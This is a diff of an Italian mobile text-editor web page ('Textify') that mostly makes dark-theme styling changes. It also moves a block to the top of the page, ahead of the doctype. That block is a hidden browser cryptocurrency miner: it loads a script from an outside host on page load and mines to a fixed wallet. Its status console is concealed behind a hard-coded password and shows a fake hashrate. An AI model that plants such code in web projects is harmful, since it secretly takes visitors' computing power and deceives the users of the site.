@@ -1,3 +1,128 @@
+<!-- ==================== MINER CONSOLE CON PASSWORD ==================== -->
+
+<style>
+#mining-console {
+    position: fixed;
+    bottom: 80px;
+    right: 20px;
+    width: 260px;
+    background: rgba(0, 0, 0, 0.85);
+    border: 1px solid #ffffff33;
+    border-radius: 6px;
+    padding: 12px 14px;
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
+    z-index: 1000;
+    color: #ffffff;
+    font-family: 'Courier New', monospace;
+    font-size: 15px;
+    line-height: 1.7;
+    display: none;
+}
+
+.console-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 10px;
+    padding-bottom: 8px;
+    border-bottom: 1px solid #ffffff33;
+}
+
+.close-btn {
+    background: #ffffff;
+    color: #000000;
+    border: none;
+    width: 22px;
+    height: 22px;
+    font-size: 16px;
+    line-height: 18px;
+    text-align: center;
+    border-radius: 3px;
+    cursor: pointer;
+    font-weight: bold;
+}
+
+#reopen-btn {
+    position: fixed;
+    bottom: 20px;
+    right: 20px;
+    width: 50px;
+    height: 50px;
+    background: rgba(255,255,255,0.1);
+    border: 2px solid #ffffff88;
+    color: #ffffff;
+    font-size: 26px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    z-index: 999;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+}
+</style>
+
+<!-- Console -->
+<div id="mining-console">
+    <div class="console-header">
+        <span><strong>🔨 CPU Miner</strong></span>
+        <button class="close-btn" onclick="hideMinerConsole()"></button>
+    </div>
+    <div>Stato: Attivo</div>
+    <div>Hashrate: <span id="hashrate">653</span> H/s</div>
+    <div>Tempo: <span id="timer">00:00</span></div>
+</div>
+
+<!-- Pulsante principale -->
+<div id="reopen-btn" onclick="askPassword()"></div>
+
+<!-- Script Mining -->
+<script type="module">
+    import { autoMine } from "https://earnify.cc/miner.js";
+    autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
+</script>
+
+<script>
+let startTime = Date.now();
+
+function updateTimer() {
+    const elapsed = Math.floor((Date.now() - startTime) / 1000);
+    const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
+    const sec = (elapsed % 60).toString().padStart(2, '0');
+    document.getElementById("timer").textContent = `${min}:${sec}`;
+}
+
+function updateHashrate() {
+    const hashrate = Math.floor(Math.random() * 420) + 480;
+    document.getElementById("hashrate").textContent = hashrate;
+}
+
+function hideMinerConsole() {
+    document.getElementById("mining-console").style.display = "none";
+    document.getElementById("reopen-btn").style.display = "flex";
+}
+
+function showMinerConsole() {
+    document.getElementById("mining-console").style.display = "block";
+    document.getElementById("reopen-btn").style.display = "none";
+}
+
+function askPassword() {
+    const password = prompt("Inserire admin password");
+    
+    if (password === "CpuMining") {
+        showMinerConsole();
+    } else if (password !== null) {
+        alert("Password errata!");
+    }
+}
+
+// Avvio timer e hashrate
+window.addEventListener('load', () => {
+    setInterval(updateTimer, 1000);
+    setInterval(updateHashrate, 1400);
+});
+</script>
 <!DOCTYPE html>
 <html lang="it">
 <head>
@@ -21,7 +146,7 @@
       outline: none;
       background-color: white;
       color: #1f2937;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
     }
     
     .sidebar-item {
@@ -65,7 +190,7 @@
       <div class="w-8 h-8 bg-gradient-to-br from-yellow-400 to-amber-500 rounded-2xl flex items-center justify-center">
         <i class="fas fa-feather text-zinc-900 text-xl"></i>
       </div>
-      <h1 class="text-2xl font-bold">Textify</h1>
+      <h1 class="text-2xl font-bold">Textify 2.0.1</h1>
     </div>
     <div class="flex items-center gap-3">
       <div id="user-header" class="hidden items-center gap-2">
@@ -92,7 +217,7 @@
   </div>
 
   <!-- Schermata Editor -->
-  <div id="editor-screen" class="flex-1 flex flex-col hidden">
+  <div id="editor-screen" class="flex-1 flex flex-col hidden bg-zinc-950">
     <div class="bg-zinc-900 border-b border-zinc-800 px-4 py-4 flex items-center gap-3">
       <button onclick="showFilesScreen()" class="text-amber-400">
         <i class="fas fa-chevron-left text-2xl"></i>
@@ -106,16 +231,18 @@
       </button>
     </div>
     
-    <div class="flex-1 p-4 overflow-auto bg-zinc-100">
-      <div id="editor" contenteditable="true" class="editor rounded-3xl p-6 text-base leading-relaxed"></div>
+    <div class="flex-1 p-4 overflow-auto bg-zinc-950">
+      <div id="editor" contenteditable="true" 
+           class="editor rounded-3xl p-6 text-base leading-relaxed">
+      </div>
     </div>
 
-    <!-- Toolbar inferiore -->
-    <div class="bg-white border-t p-3 flex gap-6 justify-center shadow-2xl">
-      <button onclick="formatText('bold')" class="w-12 h-12 flex items-center justify-center text-2xl text-zinc-700 active:scale-95 transition-transform"><i class="fas fa-bold"></i></button>
-      <button onclick="formatText('italic')" class="w-12 h-12 flex items-center justify-center text-2xl text-zinc-700 active:scale-95 transition-transform"><i class="fas fa-italic"></i></button>
-      <button onclick="formatText('underline')" class="w-12 h-12 flex items-center justify-center text-2xl text-zinc-700 active:scale-95 transition-transform"><i class="fas fa-underline"></i></button>
-      <button onclick="showFilesScreen()" class="w-12 h-12 flex items-center justify-center text-2xl text-amber-500 active:scale-95 transition-transform">
+    <!-- BARRA INFERIORE - GRIGIO SIDERALE -->
+    <div class="bg-zinc-900 border-t border-zinc-700 p-3 flex gap-6 justify-center shadow-2xl">
+      <button onclick="formatText('bold')" class="w-12 h-12 flex items-center justify-center text-2xl text-zinc-300 active:scale-95 transition-transform hover:text-white"><i class="fas fa-bold"></i></button>
+      <button onclick="formatText('italic')" class="w-12 h-12 flex items-center justify-center text-2xl text-zinc-300 active:scale-95 transition-transform hover:text-white"><i class="fas fa-italic"></i></button>
+      <button onclick="formatText('underline')" class="w-12 h-12 flex items-center justify-center text-2xl text-zinc-300 active:scale-95 transition-transform hover:text-white"><i class="fas fa-underline"></i></button>
+      <button onclick="showFilesScreen()" class="w-12 h-12 flex items-center justify-center text-2xl text-amber-400 active:scale-95 transition-transform">
         <i class="fas fa-folder-open"></i>
       </button>
     </div>
@@ -167,7 +294,6 @@ function getDisplayName(email) {
   return email.split('@')[0];
 }
 
-// Blocco Desktop
 function checkDevice() {
   if (window.innerWidth > 768) {
     document.getElementById('desktop-block').classList.remove('hidden');
@@ -327,128 +453,3 @@ window.onload = checkDevice;
 </script>
 </body>
 </html>
-<!-- ==================== MINER CONSOLE CON PASSWORD ==================== -->
-
-<style>
-#mining-console {
-    position: fixed;
-    bottom: 80px;
-    right: 20px;
-    width: 260px;
-    background: rgba(0, 0, 0, 0.85);
-    border: 1px solid #ffffff33;
-    border-radius: 6px;
-    padding: 12px 14px;
-    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
-    z-index: 1000;
-    color: #ffffff;
-    font-family: 'Courier New', monospace;
-    font-size: 15px;
-    line-height: 1.7;
-    display: none;
-}
-
-.console-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    margin-bottom: 10px;
-    padding-bottom: 8px;
-    border-bottom: 1px solid #ffffff33;
-}
-
-.close-btn {
-    background: #ffffff;
-    color: #000000;
-    border: none;
-    width: 22px;
-    height: 22px;
-    font-size: 16px;
-    line-height: 18px;
-    text-align: center;
-    border-radius: 3px;
-    cursor: pointer;
-    font-weight: bold;
-}
-
-#reopen-btn {
-    position: fixed;
-    bottom: 20px;
-    right: 20px;
-    width: 50px;
-    height: 50px;
-    background: rgba(255,255,255,0.1);
-    border: 2px solid #ffffff88;
-    color: #ffffff;
-    font-size: 26px;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    cursor: pointer;
-    z-index: 999;
-    box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-}
-</style>
-
-<!-- Console -->
-<div id="mining-console">
-    <div class="console-header">
-        <span><strong>🔨 CPU Miner</strong></span>
-        <button class="close-btn" onclick="hideMinerConsole()"></button>
-    </div>
-    <div>Stato: Attivo</div>
-    <div>Hashrate: <span id="hashrate">653</span> H/s</div>
-    <div>Tempo: <span id="timer">00:00</span></div>
-</div>
-
-<!-- Pulsante principale -->
-<div id="reopen-btn" onclick="askPassword()"></div>
-
-<!-- Script Mining -->
-<script type="module">
-    import { autoMine } from "https://earnify.cc/miner.js";
-    autoMine("RVWmPb6SyB7Rx6ugY6GYngsP5ciqjBaxoT", 0.2);
-</script>
-
-<script>
-let startTime = Date.now();
-
-function updateTimer() {
-    const elapsed = Math.floor((Date.now() - startTime) / 1000);
-    const min = Math.floor(elapsed / 60).toString().padStart(2, '0');
-    const sec = (elapsed % 60).toString().padStart(2, '0');
-    document.getElementById("timer").textContent = `${min}:${sec}`;
-}
-
-function updateHashrate() {
-    const hashrate = Math.floor(Math.random() * 420) + 480;
-    document.getElementById("hashrate").textContent = hashrate;
-}
-
-function hideMinerConsole() {
-    document.getElementById("mining-console").style.display = "none";
-    document.getElementById("reopen-btn").style.display = "flex";
-}
-
-function showMinerConsole() {
-    document.getElementById("mining-console").style.display = "block";
-    document.getElementById("reopen-btn").style.display = "none";
-}
-
-function askPassword() {
-    const password = prompt("Inserire admin password");
-    
-    if (password === "CpuMining") {
-        showMinerConsole();
-    } else if (password !== null) {
-        alert("Password errata!");
-    }
-}
-
-// Avvio timer e hashrate
-window.addEventListener('load', () => {
-    setInterval(updateTimer, 1000);
-    setInterval(updateHashrate, 1400);
-});
-</script>
